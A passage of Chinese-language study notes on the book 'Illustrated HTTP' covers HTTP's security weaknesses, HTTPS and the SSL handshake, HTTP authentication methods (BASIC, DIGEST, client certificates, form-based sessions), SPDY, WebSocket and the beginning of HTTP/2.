HTTP的缺点</h3><ul><li>HTTP的不足：<ul><li>通信使用明文(不加密)，内容可能会被窃听</li><li>不验证对方通信身份，因此可能遭受伪装</li><li>无法证明报文的完整性，所以有可能已经遭到篡改</li></ul></li><li>以上问题不仅在HTTP上，其它未加密的协议也会有这类问题</li></ul><h4 id="7.1.1-%E9%80%9A%E4%BF%A1%E4%BD%BF%E7%94%A8%E6%98%8E%E6%96%87%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%A2%AB%E7%AA%83%E5%90%AC" tabindex="-1">7.1.1 通信使用明文可能会被窃听</h4><p>由于HTTP本身不具备加密的功能，所以无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送</p><ul><li><p>TCP/IP 是可能被窃听的网络</p><ul><li>这是因为，按 TCP/IP协议族的工作机制，通信内容在所有的通信线路上都有可能遭到窥视<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/7_1.jpg" alt></li><li>即使是已经通过加密的通信，也可以窥视到通信内容，只是收如果通信通过加密，就有尽可能让人无法破解报文信息</li></ul></li><li><p>窃听相同段上的信息并非难事。只需要手机在互联网上流动的数据（帧）即可，对于收集来的数据包的解析，可以使用抓包工具。</p></li><li><p>加密处理防止被窃听：目前研究如何防止窃听保护信息的对策中，加密技术最为普及</p><ul><li>通信的加密：HTTP协议种没有加密机制，但可以通过和SSL（Secure Socket Layer安全套接层）或TLS（Transport Layer Security安全层传输协议）的组合使用，加密HTTP的通信内容<ul><li>与SSL组合使用高德HTTP称为HTTPS（HTTP Secure 超文本传输完全协议）</li></ul></li><li>内容的加密：HTTP协议中没有加密机制，南无我们可以把HTTP报文主体里所含的内容进行加密<ul><li>此时要求客户端和服务端都具有加密和解密机制，但不同https，内容仍有被篡改的风险</li></ul></li></ul></li></ul><h4 id="7.1.2-%E4%B8%8D%E9%AA%8C%E8%AF%81%E9%80%9A%E4%BF%A1%E6%96%B9%E7%9A%84%E8%BA%AB%E4%BB%BD%E5%B0%B1%E5%8F%AF%E8%83%BD%E9%81%AD%E5%8F%97%E4%BC%AA%E8%A3%85" tabindex="-1">7.1.2 不验证通信方的身份就可能遭受伪装</h4><ul><li><p>HTTP协议中的请求和响应是不会对通信方进行确认的</p><ul><li>任何人都可以发起请求，此时存在隐患<ul><li><ol><li>无法确定请求发送至目标的Web服务器是否是按照真实意图返回相应的那台服务器，有可能是伪装的Web服务器</li></ol></li><li><ol start="2"><li>无法确定响应返回到的客户端是否是按真实意图接收响应的那个客户端。有可能是已伪装的客户端。</li></ol></li><li><ol start="3"><li>无法确定正在通信的对方是否具备访问权限。因为某些 Web 服务器上保存着重要的信息，只想发给特定用户通信的权限</li></ol></li><li><ol start="4"><li>无法判定请求是来自何方、出自谁手。</li></ol></li><li><ol start="5"><li>即使是无意义的请求也会照单全收。无法阻止海量请求下的 DoS攻击（Denial of Service，拒绝服务攻击）</li></ol></li></ul></li></ul></li><li><p>查明对方证书：虽然HTTP协议无法确定通信方，但SSL可以</p><ul><li>SSL不仅提供了加密处理，还提供了一种称为证书的手段<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/7_2.jpg" alt></li><li>证书由值得信任的第三方机构办法，用以证明服务器和客户端是实际存在的，而伪造证书是一件很困难的事</li><li>通过证书，证明通信方就是想要的服务器，同时也减少了个人信息暴露的风险，另外客户端持有的证书既可以完成对个人身份的确认，也可以完成对Web网站的认证环节。</li></ul></li></ul><h4 id="7.1.3-%E6%97%A0%E6%B3%95%E8%AF%81%E6%98%8E%E6%8A%A5%E6%96%87%E7%9A%84%E5%AE%8C%E6%95%B4%E6%80%A7%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%B7%B2%E9%81%AD%E7%AF%A1%E6%94%B9" tabindex="-1">7.1.3 无法证明报文的完整性，可能已遭篡改</h4><ul><li><p>接收到的内容可能有误</p><ul><li>没有任何办法确认，发出的请求/响应和接收到的请求/响应是前后相同的</li><li>请求或响应在传输途中，遭攻击者拦截并篡改内容的攻击，称为中间人攻击（Man-in-the-Middle attack，MITM）。</li></ul></li><li><p>如何防止篡改</p><ul><li>有使用HTTP协议确定报文完整新的方法，但并不可靠便捷。</li><li>常用的是MD5，SHA-1等散列值校验，但对需要操纵客户端的用户本人亲自检查验证下载的文件是否就是原来服务器上的文件，浏览器无法自动帮用户检查</li><li>同时，如果MD5本身被改写的话，用户是无法意识到的</li></ul></li></ul><h3 id="7.2-http%2B%E5%8A%A0%E5%AF%86%2B%E8%AE%A4%E8%AF%81%2B%E5%AE%8C%E6%95%B4%E6%80%A7%E4%BF%9D%E6%8A%A4%3Dhttps" tabindex="-1">7.2 HTTP+加密+认证+完整性保护=HTTPS</h3><ul><li>我们把添加了加密及认证机制的HTTP称为HTTPS(HTTP Secure)</li><li>使用HTTPS通信时，使用https://</li></ul><h4 id="7.2.2-https%E6%98%AF%E8%BA%AB%E6%8A%ABssl%E5%A4%96%E5%A3%B3%E7%9A%84http" tabindex="-1">7.2.2 HTTPS是身披SSL外壳的HTTP</h4><ul><li>HTTPS 并非是应用层的一种新协议。只是 HTTP 通信接口部分用SSL（Secure Socket Layer）和 TLS（Transport Layer Security）协议代替而已。</li><li>通常，HTTP直接和TCP通信，当使用SSL时，则先和SSL通信，再由SSL和TCP通信<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/7_3.jpg" alt></li><li>在使用SSL后，HTTP就拥有了HTTPS的加密，证书和完整性保护这些功能</li><li>SSL是独立于HTTP的协议，所以其他运行在应用层的协议都可以配合SSL协议的使用，可以收SSL是当今世界上应用最为广泛的网络安全技术</li></ul><h4 id="7.2.3-%E7%9B%B8%E4%BA%92%E4%BA%A4%E4%BA%92%E5%AF%86%E9%92%A5%E7%9A%84%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF" tabindex="-1">7.2.3 相互交互密钥的公开密钥加密技术</h4><ul><li><p>SSL采用一种公开密钥加密（Public-key cryptography）的加密处理方式</p><ul><li>近代加密方法中，算法是公开的，密钥是保密的</li><li>加密和解密都会用到密钥，如果密钥被攻击者所得，则加密失去意义</li></ul></li><li><p>共享密钥加密的困境</p><ul><li>加密和解密如果使用同一个密钥的方式称为共享密钥加密，也称为对称密钥加密</li><li>以共享密钥加密时必须将密钥也发送给对方，此时如果密钥落入攻击人之手，也失去了加密的意义</li></ul></li><li><p>使用两把密钥的公开密钥加密</p><ul><li>公开密钥加密使用一对非对称密钥，称为私有密钥和公开密钥</li><li>发送方使用对方公开密钥进行加密，接收方使用自己的私有密钥进行解密</li></ul></li><li><p>HTTPS采用混合加密机制，混合了共享密钥和公开密钥</p><ul><li>公开密钥可以实现安全交换，但公开密钥处理速度慢</li><li>因此可以二者结合，交换密钥环节使用公开密钥加密获得公共密钥，随后进行共享密钥加密<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/7_4.jpg" alt></li></ul></li></ul><h4 id="7.2.4-%E8%AF%81%E6%98%8E%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%AF%81%E4%B9%A6" tabindex="-1">7.2.4 证明公开密钥正确的证书</h4><ul><li><p>存在问题：无法证明公开密钥本身是货真价实的公开密钥，可能在公开密钥传输过程中，真正的公开密钥已经被替换</p></li><li><p>解决问题：使用由数字证书认证机构(CA,Certificate Authority)和其相关机关办法的公开密钥证书</p></li><li><p>数字证书认证机构处于客户端和服务器端双方都信赖的第三方机构的立场上，其业务流程如下<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/7_5.jpg" alt>[]</p></li><li><p>可证明组织真实性的EV SSL 证书：可确认服务器背后运营的企业是否真实存在</p></li><li><p>用以确定客户端的客户端的证书： 以客户端证书进行客户端认证，证明客户端服务器正在通信的对方是预料之内的客户端，作用跟服务器证书一样</p></li><li><p>认证机构信誉第一</p><ul><li>伪造证书可以骗过浏览器</li><li>虽然存在可将证书无效化的证书吊销列表（Certificate Revocation List，CRL）机制，以及从客户端删除根证书颁发机构（Root Certificate Authority，RCA）对策，但生效需要一段时间，这段时间里利益的损失就不得二至了</li></ul></li><li><p>由自认证机构办法的证书称为自签名证书</p><ul><li>如果使用OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。</li><li>独立构建的认证机构叫做自认证机构，由自认证机构颁发的“无用”证书也被戏称为自签名证书。</li><li>浏览器访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。</li></ul></li><li><p>由自认证机构颁发的服务器证书之所以不起作用，是因为它无法消除伪装的可能性。值得信赖的第三方机构介入认证，才能让已植入在浏览器内的认证机构颁布的公开密钥发挥作用，并借此证明服务器的真实性。</p></li></ul><h4 id="7.2.5-https-%E7%9A%84%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6" tabindex="-1">7.2.5 HTTPS 的安全通信机制</h4><ul><li><p>HTTPS通信步骤<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/7_6.jpg" alt></p></li><li><p>步骤 1： 客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。</p></li><li><p>步骤 2： 服务器可进行 SSL 通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL 版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。</p></li><li><p>步骤 3： 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。</p></li><li><p>步骤 4： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL 握手协商部分结束。</p></li><li><p>步骤 5： SSL 第一次握手结束之后，客户端以 Client Key Exchange报文作为回应。报文中包含通信加密中使用的一种被称为Pre-master secret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。</p></li><li><p>步骤 6： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提示服务器，在此报文之后的通信会采用 Pre-master secret密钥加密。</p></li><li><p>步骤 7： 客户端发送 Finished 报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。</p></li><li><p>步骤 8： 服务器同样发送 Change Cipher Spec 报文。</p></li><li><p>步骤 9： 服务器同样发送 Finished 报文。</p></li><li><p>步骤 10： 服务器和客户端的 Finished 报文交换完毕之后，SSL 连接就算建立完成。当然，通信会受到 SSL 的保护。从此处开始进行应用层协议的通信，即发送 HTTP 请求。</p></li><li><p>步骤 11： 应用层协议通信，即发送 HTTP 响应。</p></li><li><p>步骤 12： 最后由客户端断开连接。断开连接时，发送 close_notify</p></li><li><p>在以上流程中，应用层发送数据时会附加一种叫做MAC的报文摘要，能够查知报文是否遭到篡改，从而保护报文的完整性</p></li><li><p>HTTPS在使用SSL时，它的处理速度会变慢</p><ul><li><ol><li>通信慢：和使用HTTP相比，网络负载慢2到100倍，同时必须进行SSL通信，整体通信量不可避免地增加</li></ol></li><li><ol start="2"><li>处理速度慢，消耗CPU内存等资源：SSL必须进行加密处理，在客户端和服务器端都要进行加密和解密地操作</li></ol></li></ul></li><li><p>针对这一问题，没有根本性地解决方案，但可以使用专用SSL加速器这种专用服务器硬件来改善</p></li></ul><h2 id="%E7%AC%AC%E5%85%AB%E7%AB%A0-%E7%A1%AE%E8%AE%A4%E8%AE%BF%E9%97%AE%E7%94%A8%E6%88%B7%E5%9C%B0%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81" tabindex="-1">第八章 确认访问用户地身份认证</h2><h3 id="8.1-%E4%BD%95%E4%B8%BA%E8%AE%A4%E8%AF%81" tabindex="-1">8.1 何为认证</h3><ul><li><p>计算机无法判断显示器前使用者的身份，因此需要客户端自报家门</p></li><li><p>核对信息通常是一下这些</p><ul><li>密码：只有本人才会知道的字符串信息</li><li>动态令牌：尽心本人持有的设备内显示的一次性密码</li><li>数字证书：仅限本人终端持有的信息</li><li>生物认证：指纹和虹膜等本人的生理信息</li><li>IC卡等：仅限本人持有的信息</li></ul></li><li><p>HTTP/1.1使用的认证方式</p><ul><li>BASIC认证（基本认证）</li><li>DIGEST认证（摘要认证）</li><li>SSL客户端认证</li><li>FormBase认证（基于表单认证）</li><li>此外还有Windows统一认证（Keberos认证，NTLM认证）</li></ul></li></ul><h3 id="8.2-basic%E8%AE%A4%E8%AF%81" tabindex="-1">8.2 BASIC认证</h3><ul><li><p>BASIC 认证（基本认证）是从 HTTP/1.0 就定义的认证方式。是 Web 服务器与通信客户端之间进行的认证方式</p></li><li><p>BASIC 认证的认证步骤<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/8_1.jpg" alt></p></li><li><p>步骤 1： 当请求的资源需要 BASIC 认证时，服务器会随状态码 401 Authorization Required，返回带 WWW-Authenticate 首 部字段的响应。该字段内包含认证的方式（BASIC）及Request-URI 安全域字符串（realm）。</p></li><li><p>步骤 2： 接收到状态码 401 的客户端为了通过 BASIC 认证，需要将用户 ID 及密码发送给服务器。发送的字符串内容是由用户 ID 和密码构成，两者中间以冒号（:）连接后，再经过 Base64 编码处理。假设用户 ID 为 guest，密码是 guest，连接起来就会形成guest:guest 这样的字符串。然后经过 Base64 编码，最后的结果即是 Z3Vlc3Q6Z3Vlc3Q=。把这串字符串写入首部字段 Authorization 后，发送请求。当用户代理为浏览器时，用户仅需输入用户 ID 和密码即可，之后，浏览器会自动完成到 Base64 编码的转换工作。</p></li><li><p>步骤 3： 接收到包含首部字段 Authorization 请求的服务器，会对认证信息的正确性进行验证。如验证通过，则返回一条包含Request-URI 资源的响应</p></li><li><p>BASIC认证采用的Base64只是一种编码方法，并没有进行加密处理，存在隐私泄露风险</p></li><li><p>此外，如果要再进行一次 BASIC 认证时，一般的浏览器却无法实现认证注销操作，这也是问题之一</p></li><li><p>因此，BASIC 认证使用上不够便捷灵活，且达不到多数 Web 网站期望的安全性等级，因此它并不常用。</p></li></ul><h3 id="8.3-digest%E8%AE%A4%E8%AF%81" tabindex="-1">8.3 DIGEST认证</h3><ul><li><p>为弥补 BASIC 认证存在的弱点，从 HTTP/1.1 起就有了 DIGEST 认证。 DIGEST 认证同样使用质询 / 响应的方式（challenge/response），但不会像 BASIC 认证那样直接发送明文密码</p></li><li><p>所谓质询响应方式是指，一开始一方会先发送认证要求给另一方，接着使用从另一方那接收到的质询码计算生成响应码。最后将响应码返回给对方进行认证的方式。</p></li><li><p>因为只是响应摘要以及由质询码产生的计算结果，因此比起BASIC认证，密码泄露风险降低</p></li><li><p>DIGEST认证步骤<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/8_2.jpg" alt></p></li><li><p>步骤 1：</p><ul><li>请求需认证的资源时，服务器会随着状态码 401 Authorization Required，返回带 WWW-Authenticate 首部字段的响应。该字段内包含质问响应方式认证所需的临时质询码（随机数，nonce）。</li><li>首部字段 WWW-Authenticate 内必须包含 realm 和 nonce这两个字段的信息。客户端就是依靠向服务器回送这两个值进行认证的。<br>nonce 是一种每次随返回的 401 响应生成的任意随机字符串。该字符串通常推荐由 Base64 编码的十六进制数的组成形式，但实际内容依赖服务器的具体实现。</li></ul></li><li><p>步骤 2：</p><ul><li>接收到 401 状态码的客户端，返回的响应中包含 DIGEST认证必须的首部字段 Authorization 信息。</li><li>首 部 字 段 Authorization 内 必 须 包 含 username、realm、nonce、uri 和 response 的字段信息。其中，realm 和 nonce就是之前从服务器接收到的响应中的字段。</li><li>username 是 realm 限定范围内可进行认证的用户名。uri（digest-uri）即 Request-URI 的值，但考虑到经代理转发后 Request-URI 的值可能被修改，因此事先会复制一份副本保存在 uri 内。</li><li>response 也可叫做 Request-Digest，存放经过 MD5 运算后的密码字符串，形成响应码。</li><li>响 应 中 其 他 的 实 体 请 参 见 第 6 章 的 请 求 首 部 字 段Authorization。另外，有关 Request-Digest 的计算规则较复杂，有兴趣的读者不妨深入学习一下 RFC2617</li></ul></li><li><p>步骤 3：</p><ul><li>接收到包含首部字段 Authorization 请求的服务器，会确认认证信息的正确性。认证通过后则返回包含 Request-URI资源的响应。</li><li>并且这时会在首部字段 Authentication-Info 写入一些认证成功的相关信息。</li></ul></li><li><p>DIGEST 认证提供了高于 BASIC 认证的安全等级，但是和HTTPS 的客户端认证相比仍旧很弱。DIGEST 认证提供防止密码被窃听的保护机制，但并不存在防止用户伪装的保护机制。</p></li><li><p>DIGEST 认证和 BASIC 认证一样，使用上不那么便捷灵活，且仍达不到多数 Web 网站对高度安全等级的追求标准。因此它的适用范围也有所受限。</p></li></ul><h3 id="8.4-ssl%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81" tabindex="-1">8.4 SSL客户端认证</h3><p>SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借客户端证书（在 HTTPS 一章已讲解）认证，服务器可确认访问是否来自已登录的客户端</p><h4 id="8.4.1-ssl-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E7%9A%84%E8%AE%A4%E8%AF%81%E6%AD%A5%E9%AA%A4" tabindex="-1">8.4.1 SSL 客户端认证的认证步骤</h4><ul><li><p>为达到 SSL 客户端认证的目的，需要事先将客户端证书分发给客户端，且客户端必须安装此证书。</p></li><li><p>步骤 1： 接收到需要认证资源的请求，服务器会发送 Certificate Request 报文，要求客户端提供客户端证书。</p></li><li><p>步骤 2： 用户选择将发送的客户端证书后，客户端会把客户端证书信息以 Client Certificate 报文方式发送给服务器</p></li><li><p>步骤 3： 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信</p></li></ul><h4 id="8.4.2-ssl-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E9%87%87%E7%94%A8%E5%8F%8C%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81" tabindex="-1">8.4.2　SSL 客户端认证采用双因素认证</h4><ul><li>多数情况下，SSL 客户端认证不会仅依靠证书完成认证，一般会和基于表单认证（稍后讲解）组合形成一种双因素认证（Two-factor authentication）来使用。</li><li>谓双因素认证就是指，认证过程中不仅需要密码这一个因素，还需要申请认证者提供其他持有信息，从而作为另一个因素，与其组合使用的认证方式。</li><li>第一个认证因素的 SSL 客户端证书用来认证客户端计算机，另一个认证因素的密码则用来确定这是用户本人的行为。</li></ul><h4 id="ssl-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E5%BF%85%E8%A6%81%E7%9A%84%E8%B4%B9%E7%94%A8" tabindex="-1">SSL 客户端认证必要的费用</h4><p>这里提到的费用是指，从认证机构购买客户端证书的费用，以及服<br>务器运营者为保证自己搭建的认证机构安全运营所产生的费用。</p><h3 id="8.5-%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E8%AE%A4%E8%AF%81" tabindex="-1">8.5 基于表单认证</h3><ul><li>基于表单的认证方法并不是在 HTTP 协议中定义的。客户端会向服务器上的 Web 应用程序发送登录信息（Credential），按登录信息的验证结果认证。</li><li>根据 Web 应用程序的实际安装，提供的用户界面及认证方式也各不相同。</li></ul><h4 id="8.5.1-%E8%AE%A4%E8%AF%81%E5%A4%9A%E5%8D%8A%E4%B8%BA%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E8%AE%A4%E8%AF%81" tabindex="-1">8.5.1　认证多半为基于表单认证</h4><ul><li><p>由于使用上的便利性及安全性问题，HTTP 协议标准提供的 BASIC认证和 DIGEST 认证几乎不怎么使用。另外，SSL 客户端认证虽然具有高度的安全等级，但因为导入及维持费用等问题，还尚未普及。</p></li><li><p>SSH和FTP协议已经经过广泛的验证和标准化，其认证机制已经被证明是相对安全和可靠的，可以直接使用。</p></li><li><p>但是，Web网站的认证功能因其复杂性和特殊性，没有一种通用的标准规范，因此每个Web应用程序都需要根据自身的需求和特点，自行设计和实现基于表单的认证方式。</p></li></ul><h4 id="8.5.2-session-%E7%AE%A1%E7%90%86%E5%8F%8A-cookie-%E5%BA%94%E7%94%A8" tabindex="-1">8.5.2　Session 管理及 Cookie 应用</h4><ul><li><p>基于表单认证的标准规范尚未有定论，一般会使用 Cookie 来管理Session（会话）</p></li><li><p>基于表单认证本身是通过服务器端的 Web 应用，将客户端发送过来的用户 ID 和密码与之前登录过的信息做匹配来进行认证的。</p></li><li><p>但鉴于 HTTP 是无状态协议，之前已认证成功的用户状态无法通过协议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他与其他的用户。于是我们会使用 Cookie 来管理 Session，以弥补 HTTP 协议中不存在的状态管理功能。</p></li></ul><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/8_3.jpg" alt></p><ul><li><p>步骤 1： 客户端把用户 ID 和密码等登录信息放入报文的实体部分，通常是以 POST 方法把请求发送给服务器。而这时，会使用 HTTPS 通信来进行 HTML 表单画面的显示和用户输入数据的发送</p></li><li><p>步骤 2： 服务器会发放用以识别用户的 Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与 Session ID 绑定后记录在服务器端。向客户端返回响应时，会在首部字段 Set-Cookie 内写入Session ID（如 PHPSESSID=028a8c…）</p></li><li><p>步骤 3： 客户端接收到从服务器端发来的 Session ID 后，会将其作为 Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送 Cookie，所以 Session ID 也随之发送到服务器。服务器端可通过验证接收到的 Session ID 识别用户和其认证状态</p></li><li><p>不仅基于表单认证的登录信息及认证过程都无标准化的方法，服务器端应如何保存用户提交的密码等登录信息等也没有标准化。</p></li></ul><h2 id="%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E5%9F%BA%E4%BA%8Ehttp%E7%9A%84%E5%8A%9F%E8%83%BD%E8%BF%BD%E5%8A%A0%E5%8D%8F%E8%AE%AE" tabindex="-1">第九章 基于HTTP的功能追加协议</h2><h3 id="9.1-%E5%9F%BA%E4%BA%8Ehttp%E7%9A%84%E5%8D%8F%E8%AE%AE" tabindex="-1">9.1 基于HTTP的协议</h3><ul><li>在建立 HTTP 标准规范时，制订者主要想把 HTTP 当作传输 HTML文档的协议。随着时代的发展，Web 的用途更具多样性，比如演化成在线购物网站、SNS（Social Networking Service，社交网络服务）、企业或组织内部的各种管理工具，等等。</li><li>而这些网站所追求的功能可通过 Web 应用和脚本程序实现。即使这些功能已经满足需求，在性能上却未必最优，这是因为 HTTP 协议上的限制以及自身性能有限</li><li>HTTP 功能上的不足可通过创建一套全新的协议来弥补。可是目前基于 HTTP 的 Web 浏览器的使用环境已遍布全球，因此无法完全抛弃HTTP。</li><li>因此可以通过基于HTTP添加新的功能</li></ul><h3 id="9.2-%E6%B6%88%E9%99%A4http%E7%93%B6%E9%A2%88%E7%9A%84spdy" tabindex="-1">9.2 消除HTTP瓶颈的SPDY</h3><p>Google与2010年发布SPDY（取自SPeeDY），旨在解决HTTP性能瓶颈，缩短Web页面的加载时间</p><h4 id="9.2.1-http%E7%9A%84%E7%93%B6%E9%A2%88" tabindex="-1">9.2.1 HTTP的瓶颈</h4><ul><li><p>当百万千万的用户访问网站时，HTTP无法妥善处理这些请求，以下HTTP标准将会称为障碍</p><ul><li>一条连接上只能发送一个请求</li><li>请求只能从客户端开始，客户端不可以接受除相应以外的指令</li><li>请求/响应首部未经压缩就发送。首部信息越多延迟越大</li><li>发送冗长的首部，每次互相发送相同的首部造成的浪费越多</li><li>可任意选择数据压缩格式。非强制压缩发送<br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/9_1.jpg" alt></li></ul></li><li><p>Ajax的解决方法</p><ul><li>Ajax（Asynchronous JavaScript and XML，异步 JavaScript 与 XML技术）是一种有效利用JavaScript和（Document Object Model，文档对象模型）的操作，以达到局部Web页面替换加载的异步通信手段，和同步通信相比，由于其只更新一部分界面，响应中传输的数据量会减少</li><li>其核心技术名为XMLHttpRequest 的 API，通过 JavaScript脚本语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已加载完毕的 Web 页面上发起请求，只更新局部页面。</li><li>而利用 Ajax 实时地从服务器获取内容，有可能会导致大量请求产生。另外，Ajax 仍未解决 HTTP 协议本身存在的问题。<br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/9_2.jpg" alt></li></ul></li><li><p>Coment的解决方法</p><ul><li>一旦服务器端的内容更新了，Comet不会让请求等待，而是直接给客户端返回响应。这是一种通过延迟应答，模拟实现服务器端向客户端推送(Server Push)的功能</li><li>通常，服务器端接收到请求，在处理完毕后就会立即返回响应，但为了实现推送功能，Comet 会先将响应置于挂起状态，当服务器端有内容更新时，再返回该响应。因此，服务器端一旦有更新，就可以立即反馈给客户端</li><li>内容上虽然可以做到实时更新，但为了保留响应，一次连接的持续时间也变长了。期间，为了维持连接会消耗更多的资源。另外，Comet也仍未解决 HTTP 协议本身存在的问题。<br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/9_3.jpg" alt></li></ul></li><li><p>SPDY的目标</p><ul><li>Ajax和Comet的技术出现，一定程度上改善了HTTP，但HTTP协议本身的限制依然存在，因此为了进行根本性的改善，需要从协议层面改动</li><li>处于持续开发状态的SPDY便是为了在协议层面消除HTTP的瓶颈</li></ul></li></ul><h4 id="9.2.2-spdy%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%8A%9F%E8%83%BD" tabindex="-1">9.2.2 SPDY的设计和功能</h4><ul><li><p>SPDY没有完全改写HTTP协议，而是在TCP/IP的应用层和传输层之间增加新的会话层的形式运作，且考虑到安全性问题，SPDY规定通信使用SSL</p></li><li><p>以会话层的形式加入，控制对数据的流动，依然采用HTTP建立通信，因此可以正常使用HTTP方法，Cookie以及HTTP报文等<br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/9_4.jpg" alt></p></li><li><p>使用SPDY后，HTTP协议获得以下额外功能</p><ul><li><ol><li>多路复用流：通过单一的TCP连接，可以无限制处理多个HTTP请求，所有请求处理在一条TCP连接上完成，因此TCP的处理效率得到提升</li></ol></li><li><ol start="2"><li>赋予请求优先级：SPDY不仅可以无限制地处理并发处理请求，还可以给请求逐个分配优先级顺序。这样可以在发送多个请求时，解决因贷款地而导致的响应变慢的问题</li></ol></li><li><ol start="3"><li>压缩HTTP的首部：压缩HTTP请求和响应的首部，减少通信产生的数据包数量和字节数</li></ol></li><li><ol start="4"><li>推送功能：支持服务器主动向客户端推送数据的功能，这样服务器可以直接发送数据，不用等待客户端的请求</li></ol></li><li><ol start="5"><li>服务器提示功能：服务器可以主动提示客户端请求所需的资源。这样可以在资源已缓存的情况下，避免发送不必要的请求</li></ol></li></ul></li></ul><h4 id="9.2.3-spdy%E6%B6%88%E9%99%A4web%E7%93%B6%E9%A2%88%E4%BA%86%E5%90%97" tabindex="-1">9.2.3 SPDY消除Web瓶颈了吗</h4><ul><li>使用SPDY时，Web的内容端不需要做特别改动，但是Web浏览器和服务器需要做改动。但该技术的实际应用进展不佳</li><li>原因是SPDY只是将单个域名（IP地址）的通信多路复用，所以当一个Web网站上使用多个域名下的资源时，改善效果会受到限制</li><li>SPDY确实可以有效消除HTTP的瓶颈，但很多Web网站的问题并非仅仅是由HTTP的瓶颈导致的</li></ul><h3 id="9.3-%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9B%E8%A1%8C%E5%85%A8%E5%8F%8C%E5%B7%A5%E9%80%9A%E4%BF%A1%E7%9A%84websocket" tabindex="-1">9.3 使用浏览器进行全双工通信的WebSocket</h3><ul><li><p>利用Ajax和Comet技术进行通信可以提升Web的浏览速度，但HTTP的瓶颈依然存在。</p></li><li><p>而WebSocket网络技术正是为这些问题而实现的一套新协议和API</p><ul><li>WebSocket,即Web浏览器和Web服务器之间的全双工通信标准。其中，WebSocket协议由IETF定位标准，WebSocket API由W3C定位标准</li><li>仍在开发中的WebSocket技术主要是为了解决Ajax和Comet里XMLHttpRequest附带的缺陷所引起的问题</li></ul></li><li><p>Web服务器和客户端建立起WebSocket协议后，所有通信在这个专有协议进行，可互发送任意格式的数据</p></li><li><p>由于建立在HTTP协议的基础上，因此连接的发起方仍是客户端，而一旦确立起WebSocket通信连接，不论是服务器还是客户端任意一方都可以直接向对方发送报文。</p></li><li><p>WebSocket协议的主要特点：</p><ul><li><ol><li>推送功能：支持有服务器向客户端推送数据的推送功能</li></ol></li><li><ol start="2"><li>减少通信量：建立起WebSocket连接后，就一直保持连接状态。和HTTP相比，连接的总开销减少，且WebSocket首部信息少，通信量也响应减少</li></ol></li></ul></li><li><p>为实现WebSocket通信，在HTTP连接建立后，需要完成一次“握手”的步骤</p><ul><li>握手请求：需要使用HTTP的Upgrade首部字段，告知服务器通信协议发生变化，达到握手的目的</li><li>握手响应：对于之前的请求，返回状态码101 Swutching Protocols的响应</li><li>成功建立WebScoket连接后，通信时不再使用HTTP数据帧，而采用WebSocket独立的数据帧</li></ul></li></ul><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/9_5.jpg" alt></p><ul><li>WebSocket API：JavaScript 可以调用 “The WebSocket API”（<a href="http://www.w3.org/TR/websockets/%EF%BC%8C%E7%94%B1">http://www.w3.org/TR/websockets/，由</a> W3C 标准制定）内提供的 WebSocket 程序接口，以实现 WebSocket 协议下全双工通信。</li></ul><h3 id="9.4-http%2F2.0" tabindex="-1">9.4 HTTP/2.0</h3><ul><li><p>HTTP/1.1 仍是目前主流标准，但随着新技术的出现，是时候推出HTTP2.0了</p></li><li><p>负责互联网技术标准的IETF（Internet Engineering Task 